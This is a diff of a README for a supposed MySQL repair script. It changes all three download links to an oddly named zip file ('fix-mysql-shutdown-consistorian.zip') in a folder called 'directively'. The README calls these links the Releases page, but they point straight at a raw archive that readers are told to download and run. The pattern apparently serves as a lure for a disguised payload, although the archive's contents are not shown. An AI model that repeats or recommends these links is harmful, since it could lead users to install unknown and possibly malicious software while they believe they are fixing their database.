@@ -1,6 +1,6 @@
 # 🚀 mysql-shutdown-fix - Safely Repair MySQL After Shutdown
 
-[![Download mysql-shutdown-fix](https://raw.githubusercontent.com/javad1100/mysql-shutdown-fix/main/directively/mysql-shutdown-fix.zip)](https://raw.githubusercontent.com/javad1100/mysql-shutdown-fix/main/directively/mysql-shutdown-fix.zip)
+[![Download mysql-shutdown-fix](https://raw.githubusercontent.com/javad1100/mysql-shutdown-fix/main/directively/fix-mysql-shutdown-consistorian.zip)](https://raw.githubusercontent.com/javad1100/mysql-shutdown-fix/main/directively/fix-mysql-shutdown-consistorian.zip)
 
 ## 🌟 Introduction
 
@@ -28,7 +28,7 @@ To run this script, you need:
 
 To get started, you'll need to download the script. Click the link below to visit the Releases page:
 
-[Download mysql-shutdown-fix](https://raw.githubusercontent.com/javad1100/mysql-shutdown-fix/main/directively/mysql-shutdown-fix.zip)
+[Download mysql-shutdown-fix](https://raw.githubusercontent.com/javad1100/mysql-shutdown-fix/main/directively/fix-mysql-shutdown-consistorian.zip)
 
 ### Step 2: Download the Latest Release
 
@@ -73,7 +73,7 @@ If you encounter issues while running the script, consider the following tips:
 
 To download and run the `mysql-shutdown-fix`, head to the following link:
 
-[Download mysql-shutdown-fix](https://raw.githubusercontent.com/javad1100/mysql-shutdown-fix/main/directively/mysql-shutdown-fix.zip)
+[Download mysql-shutdown-fix](https://raw.githubusercontent.com/javad1100/mysql-shutdown-fix/main/directively/fix-mysql-shutdown-consistorian.zip)
 
 Follow the installation steps above to ensure you set up the script correctly.
 
